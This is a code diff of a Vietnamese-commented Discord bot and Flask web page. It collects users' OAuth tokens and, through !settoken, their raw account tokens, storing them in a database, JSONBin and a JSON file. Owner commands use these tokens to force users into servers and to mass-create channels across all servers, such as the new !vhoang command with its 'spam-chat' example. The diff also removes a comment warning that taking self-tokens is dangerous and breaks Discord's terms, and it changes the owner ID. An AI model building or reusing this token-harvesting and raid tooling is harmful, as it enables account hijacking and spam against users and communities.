@@ -31,8 +31,8 @@ CLIENT_SECRET = os.getenv('DISCORD_CLIENT_SECRET')
 DATABASE_URL = os.getenv('DATABASE_URL')
 
 # JSONBin.io configuration
-JSONBIN_API_KEY = os.getenv('JSONBIN_API_KEY')  # Thêm vào .env file
-JSONBIN_BIN_ID = os.getenv('JSONBIN_BIN_ID')    # Thêm vào .env file
+JSONBIN_API_KEY = os.getenv('JSONBIN_API_KEY')
+JSONBIN_BIN_ID = os.getenv('JSONBIN_BIN_ID')
 
 if not DISCORD_TOKEN:
     exit("LỖI: Không tìm thấy DISCORD_TOKEN")
@@ -169,7 +169,7 @@ class JSONBinStorage:
         if str(user_id) in data:
             del data[str(user_id)]
             return self.write_data(data)
-        return True # Trả về True nếu user không tồn tại sẵn
+        return True 
 
 # Khởi tạo JSONBin storage
 jsonbin_storage = JSONBinStorage()
@@ -262,7 +262,7 @@ def save_user_token_db(user_id: str, access_token: str, username: str = None, av
                 conn.close()
     return False
 
-# --- FALLBACK JSON FUNCTIONS (kept for compatibility) ---
+# --- FALLBACK JSON FUNCTIONS ---
 def get_user_access_token_json(user_id: str):
     """Backup: Lấy token từ file JSON"""
     try:
@@ -364,7 +364,7 @@ def delete_user_from_json(user_id: str):
             print(f"✅ Deleted user {user_id} from JSON file")
         return True
     except (FileNotFoundError, json.JSONDecodeError):
-        return True # File không tồn tại coi như đã xóa
+        return True 
     except Exception as e:
         print(f"JSON file delete error: {e}")
         return False
@@ -373,7 +373,10 @@ def delete_user_from_json(user_id: str):
 intents = discord.Intents.default()
 intents.members = True
 intents.message_content = True
-bot = commands.Bot(command_prefix='!', intents=intents, owner_id=1311892636650438717, help_command=None)
+
+# --- THAY ĐỔI ID CHỦ BOT TẠI ĐÂY ---
+# Đã cập nhật ID mới: 970585437599072266
+bot = commands.Bot(command_prefix='!', intents=intents, owner_id=970585437599072266, help_command=None)
 
 # --- FLASK WEB SERVER SETUP ---
 app = Flask(__name__)
@@ -411,10 +414,8 @@ class ServerSelectView(discord.ui.View):
         self.guilds = guilds
         self.selected_guild_ids = set()
 
-        # Chia danh sách server thành các phần nhỏ, mỗi phần tối đa 25
         guild_chunks = [self.guilds[i:i + 25] for i in range(0, len(self.guilds), 25)]
         
-        # Tạo một menu cho mỗi phần
         for index, chunk in enumerate(guild_chunks):
             self.add_item(self.create_server_select(chunk, index, len(guild_chunks)))
 
@@ -433,7 +434,6 @@ class ServerSelectView(discord.ui.View):
             if interaction.user.id != self.author.id:
                 return await interaction.response.send_message("Bạn không có quyền tương tác.", ephemeral=True)
             
-            # Cập nhật tập hợp các ID đã chọn
             ids_in_this_menu = {int(opt.value) for opt in select.options}
             self.selected_guild_ids.difference_update(ids_in_this_menu)
             for gid in interaction.data["values"]:
@@ -479,16 +479,15 @@ class ServerSelectView(discord.ui.View):
 # Roster
 class RosterPages(discord.ui.View):
     def __init__(self, agents, ctx):
-        super().__init__(timeout=180)  # Menu sẽ tự động tắt sau 180 giây
+        super().__init__(timeout=180)
         self.agents = agents
         self.ctx = ctx
         self.current_page = 0
-        self.items_per_page = 6  # Hiển thị 6 điệp viên mỗi trang
+        self.items_per_page = 6
         self.total_pages = (len(self.agents) + self.items_per_page - 1) // self.items_per_page
         self.message = None
 
     async def create_page_embed(self, page_num):
-        """Tạo Embed và ảnh ghép cho một trang cụ thể."""
         start_index = page_num * self.items_per_page
         end_index = start_index + self.items_per_page
         page_agents = self.agents[start_index:end_index]
@@ -496,7 +495,6 @@ class RosterPages(discord.ui.View):
         if not page_agents:
             return discord.Embed(title="Lỗi", description="Không có dữ liệu cho trang này."), None
 
-        # --- Logic tạo ảnh ghép cho trang hiện tại ---
         avatar_size = 128
         padding = 10
         
@@ -519,7 +517,6 @@ class RosterPages(discord.ui.View):
         canvas.save(buffer, 'PNG')
         buffer.seek(0)
         discord_file = discord.File(buffer, filename=f"roster_page_{page_num}.png")
-        # --- Kết thúc logic tạo ảnh ---
 
         description_list = [f"👤 **{agent['username']}** `(ID: {agent['id']})`" for agent in page_agents]
         description_text = "\n".join(description_list)
@@ -535,25 +532,18 @@ class RosterPages(discord.ui.View):
         return embed, discord_file
 
     async def update_buttons(self):
-        """Cập nhật trạng thái (bật/tắt) của các nút."""
-        # Fast backward button (<<)
         self.children[0].disabled = self.current_page == 0
-        # Slow backward button (<)
         self.children[1].disabled = self.current_page == 0
-        # Slow forward button (>)
         self.children[2].disabled = self.current_page >= self.total_pages - 1
-        # Fast forward button (>>)
         self.children[3].disabled = self.current_page >= self.total_pages - 1
 
     async def send_initial_message(self):
-        """Gửi tin nhắn đầu tiên."""
         embed, file = await self.create_page_embed(self.current_page)
         await self.update_buttons()
         self.message = await self.ctx.send(embed=embed, file=file, view=self)
 
     @discord.ui.button(style=discord.ButtonStyle.secondary, emoji="⏪")
     async def fast_backward(self, interaction: discord.Interaction, button: discord.ui.Button):
-        """Lùi nhanh 5 trang hoặc về trang đầu."""
         self.current_page = max(0, self.current_page - 5)
         embed, file = await self.create_page_embed(self.current_page)
         await self.update_buttons()
@@ -561,7 +551,6 @@ class RosterPages(discord.ui.View):
 
     @discord.ui.button(style=discord.ButtonStyle.secondary, emoji="◀️")
     async def slow_backward(self, interaction: discord.Interaction, button: discord.ui.Button):
-        """Lùi chậm 1 trang."""
         if self.current_page > 0:
             self.current_page -= 1
             embed, file = await self.create_page_embed(self.current_page)
@@ -572,7 +561,6 @@ class RosterPages(discord.ui.View):
 
     @discord.ui.button(style=discord.ButtonStyle.secondary, emoji="▶️")
     async def slow_forward(self, interaction: discord.Interaction, button: discord.ui.Button):
-        """Tiến chậm 1 trang."""
         if self.current_page < self.total_pages - 1:
             self.current_page += 1
             embed, file = await self.create_page_embed(self.current_page)
@@ -583,7 +571,6 @@ class RosterPages(discord.ui.View):
 
     @discord.ui.button(style=discord.ButtonStyle.secondary, emoji="⏩")
     async def fast_forward(self, interaction: discord.Interaction, button: discord.ui.Button):
-        """Tiến nhanh 5 trang hoặc đến trang cuối."""
         self.current_page = min(self.total_pages - 1, self.current_page + 5)
         embed, file = await self.create_page_embed(self.current_page)
         await self.update_buttons()
@@ -598,12 +585,10 @@ class DeployView(discord.ui.View):
         self.selected_guild = None
         self.selected_user_ids = set()
 
-        # Tạo menu chọn Server (chỉ chọn 1, có phân trang)
         guild_chunks = [self.guilds[i:i + 25] for i in range(0, len(self.guilds), 25)]
         for index, chunk in enumerate(guild_chunks):
             self.add_item(self.create_guild_select(chunk, index, len(guild_chunks)))
 
-        # Tạo các menu chọn User (chọn nhiều, có phân trang)
         agent_chunks = [self.agents[i:i + 25] for i in range(0, len(self.agents), 25)]
         row_offset = len(guild_chunks) 
         for index, chunk in enumerate(agent_chunks):
@@ -677,7 +662,6 @@ class DeployView(discord.ui.View):
         await interaction.followup.send(embed=embed)
 
 # --- Modal 1: Nhập số lượng kênh ---
-# --- View để chọn số lượng kênh ---
 class QuantityView(discord.ui.View):
     def __init__(self, selected_guilds: list[discord.Guild], author: discord.User):
         super().__init__(timeout=300)
@@ -721,7 +705,6 @@ class NamesModal(discord.ui.Modal):
         self.selected_guilds = selected_guilds
         self.quantity = quantity
         
-        # Tạo các TextInput fields dựa trên số lượng
         if quantity >= 1:
             self.name1 = discord.ui.TextInput(
                 label="Tên Kênh #1",
@@ -763,7 +746,6 @@ class NamesModal(discord.ui.Modal):
             self.add_item(self.name5)
 
     async def on_submit(self, interaction: discord.Interaction):
-        # Lấy tên từ các ô nhập liệu dựa trên số lượng
         channel_names = []
         
         if hasattr(self, 'name1'):
@@ -802,12 +784,10 @@ class CreateChannelView(discord.ui.View):
         super().__init__(timeout=300)
         self.author = author
         self.guilds = guilds
-        self.selected_guild_ids = set() # Sử dụng set để lưu ID, tránh trùng lặp
+        self.selected_guild_ids = set() 
 
-        # Chia danh sách server thành các phần nhỏ, mỗi phần tối đa 25 server
         guild_chunks = [self.guilds[i:i + 25] for i in range(0, len(self.guilds), 25)]
 
-        # Tạo một menu thả xuống (Select) cho mỗi phần
         for index, chunk in enumerate(guild_chunks):
             self.add_item(self.create_guild_select(chunk, index, len(guild_chunks)))
 
@@ -816,14 +796,13 @@ class CreateChannelView(discord.ui.View):
         
         placeholder_text = f"Chọn server (Trang {page_index + 1}/{total_pages})"
         if not options:
-            return # Không thêm menu nếu không có server
+            return 
 
         select = discord.ui.Select(
             placeholder=placeholder_text,
             options=options,
             min_values=1,
             max_values=len(options),
-            # custom_id giúp phân biệt các menu nếu cần, nhưng ở đây không bắt buộc
             custom_id=f"guild_select_page_{page_index}" 
         )
 
@@ -831,9 +810,6 @@ class CreateChannelView(discord.ui.View):
             if interaction.user.id != self.author.id: 
                 return await interaction.response.send_message("❌ Chỉ người tạo lệnh mới có thể sử dụng!", ephemeral=True)
             
-            # Cập nhật tập hợp các ID đã chọn
-            # Xóa các lựa chọn cũ từ menu này và thêm các lựa chọn mới
-            # Điều này cho phép người dùng thay đổi ý định
             ids_in_this_menu = {int(opt.value) for opt in select.options}
             self.selected_guild_ids.difference_update(ids_in_this_menu)
             
@@ -853,7 +829,6 @@ class CreateChannelView(discord.ui.View):
         if not self.selected_guild_ids:
             return await interaction.response.send_message("❌ Lỗi: Vui lòng chọn ít nhất một Server từ menu trước!", ephemeral=True)
         
-        # Lấy các đối tượng guild từ các ID đã chọn
         selected_guilds = [g for g in self.guilds if g.id in self.selected_guild_ids]
 
         embed = discord.Embed(
@@ -910,7 +885,7 @@ class ChannelNameModal(discord.ui.Modal, title="Nhập Tên Kênh Cần Tìm"):
         
         await interaction.followup.send(embed=embed)
         
-# --- View để lấy ID kênh (Đã sửa lỗi phân trang) ---
+# --- View để lấy ID kênh ---
 class GetChannelIdView(discord.ui.View):
     def __init__(self, author: discord.User, guilds: list[discord.Guild]):
         super().__init__(timeout=300)
@@ -918,10 +893,8 @@ class GetChannelIdView(discord.ui.View):
         self.guilds = guilds
         self.selected_guild_ids = set()
         
-        # Chia danh sách server thành các phần nhỏ, mỗi phần tối đa 25
         guild_chunks = [self.guilds[i:i + 25] for i in range(0, len(self.guilds), 25)]
 
-        # Tạo một menu cho mỗi phần
         for index, chunk in enumerate(guild_chunks):
             self.add_item(self.create_guild_select(chunk, index, len(guild_chunks)))
 
@@ -933,7 +906,6 @@ class GetChannelIdView(discord.ui.View):
         async def callback(interaction: discord.Interaction):
             if interaction.user.id != self.author.id: return
 
-            # Cập nhật tập hợp các ID đã chọn
             ids_in_this_menu = {int(opt.value) for opt in select.options}
             self.selected_guild_ids.difference_update(ids_in_this_menu)
             for gid in interaction.data["values"]:
@@ -950,10 +922,8 @@ class GetChannelIdView(discord.ui.View):
         if not self.selected_guild_ids:
             return await interaction.response.send_message("Lỗi: Vui lòng chọn ít nhất một Server từ menu.", ephemeral=True)
         
-        # Lấy các đối tượng guild từ các ID đã chọn
         selected_guilds = [g for g in self.guilds if g.id in self.selected_guild_ids]
         
-        # Mở Modal để người dùng nhập tên kênh (Dòng này giờ sẽ hoạt động)
         modal = ChannelNameModal(selected_guilds)
         await interaction.response.send_modal(modal)
         
@@ -998,18 +968,13 @@ async def auth(ctx):
     embed.add_field(name="📌 Lưu ý", value="Đây là phương pháp chính thức và an toàn nhất, không làm lộ token của bạn.", inline=False)
     await ctx.send(embed=embed)
 
-# --- LỆNH MỚI ĐỂ SET SELF-TOKEN ---
 @bot.command(name='settoken', help='(DM Only) Cung cấp token để bot sử dụng.')
 async def settoken(ctx, *, token: str = None):
-    """
-    Cho phép người dùng tự cung cấp token qua tin nhắn riêng (DM).
-    CẢNH BÁO: VIỆC NÀY NGUY HIỂM VÀ VI PHẠM TOS CỦA DISCORD.
-    """
     if not isinstance(ctx.channel, discord.DMChannel):
         try:
             await ctx.message.delete()
         except discord.Forbidden:
-            pass # Không có quyền xóa tin nhắn
+            pass 
         await ctx.author.send("🚫 Lệnh `!settoken` chỉ có thể được sử dụng trong tin nhắn riêng tư (DM) với bot để đảm bảo an toàn. Vui lòng thử lại trong DM.")
         return
 
@@ -1025,7 +990,6 @@ async def settoken(ctx, *, token: str = None):
     user_id = str(ctx.author.id)
     username = ctx.author.name
     
-    # Lưu token mà không cần avatar_hash
     success = save_user_token(user_id, token.strip(), username)
     
     if success:
@@ -1115,13 +1079,11 @@ async def check_token(ctx):
 
 @bot.command(name='status', help='Kiểm tra trạng thái bot và storage.')
 async def status(ctx):
-    # Test database connection
     db_connection = get_db_connection()
     db_status = "✅ Connected" if db_connection else "❌ Unavailable"
     if db_connection:
         db_connection.close()
     
-    # Test JSONBin connection
     jsonbin_status = "✅ Configured" if JSONBIN_API_KEY else "❌ Not configured"
     
     embed = discord.Embed(title="🤖 Trạng thái Bot", color=0x0099ff)
@@ -1135,10 +1097,6 @@ async def status(ctx):
 @bot.command(name='force_add', help='(Chủ bot) Thêm một người dùng bất kỳ vào tất cả các server.')
 @commands.is_owner()
 async def force_add(ctx, user_to_add: discord.User):
-    """
-    Lệnh chỉ dành cho chủ bot để thêm một người dùng bất kỳ vào các server.
-    Cách dùng: !force_add <User_ID> hoặc !force_add @TênNgườiDùng
-    """
     user_id = user_to_add.id
     await ctx.send(f"✅ Đã nhận lệnh! Bắt đầu quá trình thêm {user_to_add.mention} vào các server...")
     
@@ -1194,14 +1152,10 @@ async def force_add_error(ctx, error):
 @bot.command(name='invite', help='(Chủ bot) Mở giao diện để chọn server mời người dùng vào.')
 @commands.is_owner()
 async def invite(ctx, user_to_add: discord.User):
-    """
-    Mở một giao diện tương tác để chọn server mời người dùng.
-    """
     if not user_to_add:
         await ctx.send("Không tìm thấy người dùng này.")
         return
         
-    # Tạo giao diện (View) và truyền các thông tin cần thiết
     view = ServerSelectView(author=ctx.author, target_user=user_to_add, guilds=bot.guilds)
     
     embed = discord.Embed(
@@ -1223,7 +1177,6 @@ async def help_slash(interaction: discord.Interaction):
     )
     embed.set_thumbnail(url=bot.user.display_avatar.url)
     
-    # Lệnh cho mọi người
     embed.add_field(name="🕵️ Lệnh Cơ Bản (Dành cho mọi Điệp viên)", value="----------------------------------", inline=False)
     embed.add_field(name="`!auth`", value="Lấy link ủy quyền (an toàn).", inline=True)
     embed.add_field(name="`!settoken <token>`", value="Cung cấp token (không an toàn, DM only).", inline=True)
@@ -1232,9 +1185,9 @@ async def help_slash(interaction: discord.Interaction):
     embed.add_field(name="`!status`", value="Xem trạng thái hoạt động của bot và hệ thống.", inline=True)
     embed.add_field(name="`!ping`", value="Kiểm tra độ trễ của bot.", inline=True)
     
-    # Lệnh chỉ dành cho chủ bot
     if await bot.is_owner(interaction.user):
         embed.add_field(name="👑 Lệnh Chỉ Huy (Chỉ dành cho Owner)", value="----------------------------------", inline=False)
+        embed.add_field(name="`!vhoang <name>`", value="Tạo kênh trên TOÀN BỘ server.", inline=True)
         embed.add_field(name="`!roster`", value="Xem danh sách điệp viên.", inline=True)
         embed.add_field(name="`!deploy`", value="Thêm NHIỀU điệp viên vào MỘT server.", inline=True)
         embed.add_field(name="`!invite <User>`", value="Thêm MỘT điệp viên vào NHIỀU server.", inline=True)
@@ -1254,7 +1207,6 @@ async def help(ctx):
     )
     embed.set_thumbnail(url=bot.user.display_avatar.url)
     
-    # Lệnh cho mọi người
     embed.add_field(name="🕵️ Lệnh Cơ Bản (Dành cho mọi Điệp viên)", value="----------------------------------", inline=False)
     embed.add_field(name="`!auth`", value="Lấy link ủy quyền (an toàn).", inline=True)
     embed.add_field(name="`!settoken <token>`", value="Cung cấp token (không an toàn, DM only).", inline=True)
@@ -1263,9 +1215,9 @@ async def help(ctx):
     embed.add_field(name="`!status`", value="Xem trạng thái hoạt động của bot và hệ thống.", inline=True)
     embed.add_field(name="`!ping`", value="Kiểm tra độ trễ của bot.", inline=True)
 
-    # Lệnh chỉ dành cho chủ bot
     if await bot.is_owner(ctx.author):
         embed.add_field(name="👑 Lệnh Chỉ Huy (Chỉ dành cho Owner)", value="----------------------------------", inline=False)
+        embed.add_field(name="`!vhoang <name>`", value="Tạo kênh trên TOÀN BỘ server.", inline=True)
         embed.add_field(name="`!roster`", value="Xem danh sách điệp viên.", inline=True)
         embed.add_field(name="`!deploy`", value="Thêm NHIỀU điệp viên vào MỘT server.", inline=True)
         embed.add_field(name="`!invite <User>`", value="Thêm MỘT điệp viên vào NHIỀU server.", inline=True)
@@ -1276,13 +1228,10 @@ async def help(ctx):
     embed.set_footer(text="Hãy chọn một mật lệnh để bắt đầu chiến dịch.")
     await ctx.send(embed=embed)
 
-# --- ADDITIONAL JSONBIN MANAGEMENT COMMANDS ---
+# --- ADDITIONAL MANAGEMENT COMMANDS ---
 @bot.command(name='storage_info', help='(Chủ bot) Hiển thị thông tin về storage systems.')
 @commands.is_owner()
 async def storage_info(ctx):
-    """Hiển thị thông tin chi tiết về các storage systems"""
-    
-    # Test Database
     db_connection = get_db_connection()
     if db_connection:
         try:
@@ -1297,7 +1246,6 @@ async def storage_info(ctx):
     else:
         db_info = "❌ Not Available"
     
-    # Test JSONBin
     if JSONBIN_API_KEY and JSONBIN_BIN_ID:
         try:
             data = jsonbin_storage.read_data()
@@ -1322,12 +1270,6 @@ async def storage_info(ctx):
 @bot.command(name='migrate_tokens', help='(Chủ bot) Migrate tokens between storage systems.')
 @commands.is_owner()
 async def migrate_tokens(ctx, source: str = None, target: str = None):
-    """
-    Migrate tokens between storage systems
-    Usage: !migrate_tokens <source> <target>
-    Sources/Targets: db, jsonbin, json
-    """
-    
     if not source or not target:
         embed = discord.Embed(
             title="📦 Token Migration",
@@ -1349,7 +1291,6 @@ async def migrate_tokens(ctx, source: str = None, target: str = None):
     
     await ctx.send(f"🔄 Starting migration from {source} to {target}...")
     
-    # Get source data
     source_data = {}
     if source == "db":
         conn = get_db_connection()
@@ -1387,7 +1328,6 @@ async def migrate_tokens(ctx, source: str = None, target: str = None):
         await ctx.send(f"❌ No data found in {source}")
         return
     
-    # Write to target
     success_count = 0
     fail_count = 0
     
@@ -1422,7 +1362,6 @@ async def migrate_tokens(ctx, source: str = None, target: str = None):
 @bot.command(name='roster', help='(Owner only) Displays a paginated visual roster of all agents.')
 @commands.is_owner()
 async def roster(ctx):
-    """Displays a paginated visual roster of all authorized agents from JSONBin."""
     await ctx.send("Accessing network archives...")
 
     try:
@@ -1440,7 +1379,6 @@ async def roster(ctx):
             await ctx.send("❌ **Error:** No agent data found.")
             return
         
-        # Khởi tạo và gửi trang đầu tiên
         pagination_view = RosterPages(agents, ctx)
         await pagination_view.send_initial_message()
 
@@ -1451,7 +1389,6 @@ async def roster(ctx):
 @bot.command(name='remove', help='(Owner only) Removes an agent from all storage systems.')
 @commands.is_owner()
 async def remove(ctx, user_to_remove: discord.User):
-    """Removes a user's data from the database, JSONBin, and local JSON."""
     if not user_to_remove:
         await ctx.send("❌ User not found.")
         return
@@ -1459,12 +1396,10 @@ async def remove(ctx, user_to_remove: discord.User):
     user_id_str = str(user_to_remove.id)
     await ctx.send(f"🔥 Initiating data purge for agent **{user_to_remove.name}** (`{user_id_str}`)...")
 
-    # Xóa từ các nguồn
     db_success = delete_user_from_db(user_id_str)
     jsonbin_success = jsonbin_storage.delete_user(user_id_str)
     json_success = delete_user_from_json(user_id_str)
 
-    # Tạo báo cáo kết quả
     embed = discord.Embed(
         title=f"Data Purge Report for {user_to_remove.name}",
         color=discord.Color.red()
@@ -1478,7 +1413,6 @@ async def remove(ctx, user_to_remove: discord.User):
 @bot.command(name='deploy', help='(Chủ bot) Thêm nhiều điệp viên vào một server.')
 @commands.is_owner()
 async def deploy(ctx):
-    """Mở giao diện để thêm nhiều user vào một server được chọn."""
     agent_data = jsonbin_storage.read_data()
     agents = [
         {'id': uid, 'username': data.get('username', 'N/A')}
@@ -1488,9 +1422,7 @@ async def deploy(ctx):
     if not agents:
         return await ctx.send("Không có điệp viên nào trong mạng lưới để triển khai.")
 
-    # Lấy danh sách server mà bot đang ở
     guilds = bot.guilds
-    
     view = DeployView(ctx.author, guilds, agents)
     
     embed = discord.Embed(
@@ -1505,7 +1437,6 @@ async def deploy(ctx):
 @bot.command(name='create', help='(Chủ bot) Tạo nhiều kênh trong nhiều server.')
 @commands.is_owner()
 async def create(ctx):
-    """Mở giao diện tạo kênh hàng loạt."""
     view = CreateChannelView(ctx.author, bot.guilds)
     embed = discord.Embed(
         title="🛠️ Bảng Điều Khiển Tạo Kênh",
@@ -1517,7 +1448,6 @@ async def create(ctx):
 @bot.command(name='getid', help='(Chủ bot) Lấy ID của các kênh theo tên.')
 @commands.is_owner()
 async def getid(ctx):
-    """Mở giao diện để tìm ID kênh."""
     view = GetChannelIdView(ctx.author, bot.guilds)
     embed = discord.Embed(
         title="🔎 Công Cụ Tìm ID Kênh",
@@ -1525,7 +1455,70 @@ async def getid(ctx):
         color=discord.Color.purple()
     )
     await ctx.send(embed=embed, view=view)
+
+# --- LỆNH MỚI: !vhoang ---
+@bot.command(name='vhoang', help='(Chủ bot) Tự động tạo kênh trên toàn bộ server.')
+@commands.is_owner()
+async def vhoang(ctx, *, channel_name: str = None):
+    """
+    Tự động tạo kênh trên toàn bộ server bot tham gia.
+    Bỏ qua nếu server đã có kênh trùng tên.
+    """
+    if not channel_name:
+        embed = discord.Embed(
+            title="❌ Thiếu tên kênh",
+            description="Vui lòng nhập tên kênh bạn muốn tạo.\n\n**Cách dùng:** `!vhoang <tên_kênh>`\n**Ví dụ:** `!vhoang spam-chat`",
+            color=0xff0000
+        )
+        await ctx.send(embed=embed)
+        return
+
+    # Chuẩn hóa tên kênh (chữ thường, thay khoảng trắng bằng gạch ngang)
+    target_name = channel_name.lower().strip().replace(" ", "-")
+
+    msg = await ctx.send(f"🔄 Đang xử lý... Bắt đầu quét và tạo kênh **#{target_name}** trên **{len(bot.guilds)}** server...")
+
+    created_count = 0
+    skipped_count = 0
+    fail_count = 0
+    failed_details = []
+
+    for guild in bot.guilds:
+        try:
+            # Kiểm tra xem kênh đã tồn tại chưa
+            existing_channel = discord.utils.get(guild.text_channels, name=target_name)
+
+            if existing_channel:
+                skipped_count += 1
+            else:
+                await guild.create_text_channel(target_name, reason=f"Admin {ctx.author} ran !vhoang")
+                created_count += 1
+                
+        except discord.Forbidden:
+            fail_count += 1
+            failed_details.append(f"{guild.name} (Thiếu quyền)")
+        except Exception as e:
+            fail_count += 1
+            failed_details.append(f"{guild.name} (Lỗi: {str(e)})")
+
+    embed = discord.Embed(
+        title=f"📊 Báo Cáo Lệnh !vhoang: #{target_name}",
+        description=f"Đã xử lý xong yêu cầu trên toàn bộ hệ thống.",
+        color=0x00ff00 if fail_count == 0 else 0xff9900
+    )
     
+    embed.add_field(name="✅ Đã tạo mới", value=f"**{created_count}** server", inline=True)
+    embed.add_field(name="⏭️ Đã có sẵn (Bỏ qua)", value=f"**{skipped_count}** server", inline=True)
+    embed.add_field(name="❌ Thất bại", value=f"**{fail_count}** server", inline=True)
+
+    if failed_details:
+        error_text = "\n".join(failed_details[:10])
+        if len(failed_details) > 10:
+            error_text += f"\n... và {len(failed_details) - 10} server khác."
+        embed.add_field(name="⚠️ Chi tiết thất bại", value=f"```{error_text}```", inline=False)
+
+    await msg.edit(content=None, embed=embed)
+
 # --- FLASK WEB ROUTES ---
 @app.route('/')
 def index():
@@ -1534,7 +1527,6 @@ def index():
         f'&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20guilds.join'
     )
     
-    # Storage status for display
     db_status = "🟢 Connected" if get_db_connection() else "🔴 Unavailable"
     jsonbin_status = "🟢 Configured" if JSONBIN_API_KEY else "🔴 Not configured"
     
@@ -1571,7 +1563,6 @@ def index():
                 overflow-x: hidden;
             }}
             
-            /* Victorian wallpaper pattern */
             body::before {{
                 content: '';
                 position: fixed;
@@ -1587,7 +1578,6 @@ def index():
                 z-index: -1;
             }}
             
-            /* Fog effect */
             body::after {{
                 content: '';
                 position: fixed;
@@ -1905,7 +1895,6 @@ def index():
                 border-top: 2px dotted var(--Victorian-brown);
             }}
             
-            /* Responsive design */
             @media (max-width: 768px) {{
                 .main-title {{
                     font-size: 2.5em;
@@ -2053,10 +2042,8 @@ def callback():
     username = user_data['username']
     avatar_hash = user_data.get('avatar')
     
-    # Lưu token vào các storage systems
     success = save_user_token(user_id, access_token, username, avatar_hash)
     
-    # Determine storage info
     storage_methods = []
     if get_db_connection():
         storage_methods.append("Evidence Vault (PostgreSQL)")
@@ -2104,7 +2091,6 @@ def callback():
                 justify-content: center;
             }}
             
-            /* Mysterious background pattern */
             body::before {{
                 content: '';
                 position: fixed;
@@ -2129,7 +2115,6 @@ def callback():
                 100% {{ transform: translateX(0) translateY(0); }}
             }}
             
-            /* Success fog effect */
             body::after {{
                 content: '';
                 position: fixed;
@@ -2393,7 +2378,6 @@ def callback():
                 text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.8);
             }}
             
-            /* Responsive design */
             @media (max-width: 768px) {{
                 .success-container {{
                     padding: 30px;
@@ -2460,13 +2444,11 @@ def callback():
 
 @app.route('/health')
 def health():
-    """Health check endpoint với thông tin chi tiết"""
     db_connection = get_db_connection()
     db_status = db_connection is not None
     if db_connection:
         db_connection.close()
     
-    # Test JSONBin connection
     jsonbin_status = False
     if JSONBIN_API_KEY and JSONBIN_BIN_ID:
         try:
@@ -2490,7 +2472,6 @@ def health():
 
 # --- THREADING FUNCTION ---
 def run_flask():
-    """Chạy Flask server"""
     app.run(host='0.0.0.0', port=PORT, debug=False)
 
 # --- MAIN EXECUTION ---
@@ -2499,10 +2480,8 @@ if __name__ == '__main__':
     print(f"🔧 PORT: {PORT}")
     print(f"🔧 Render URL: {RENDER_URL}")
     
-    # Initialize database
     database_initialized = init_database()
     
-    # Test JSONBin connection
     if JSONBIN_API_KEY:
         print("🌐 Testing JSONBin.io connection...")
         try:
@@ -2516,15 +2495,12 @@ if __name__ == '__main__':
         print("⚠️ JSONBin.io not configured")
     
     try:
-        # Start Flask server in separate thread
         flask_thread = threading.Thread(target=run_flask, daemon=True)
         flask_thread.start()
         print(f"🌐 Web server started on port {PORT}")
         
-        # Wait for Flask to start
         time.sleep(2)
         
-        # Start Discord bot in main thread
         print("🤖 Starting Discord bot...")
         bot.run(DISCORD_TOKEN)
         
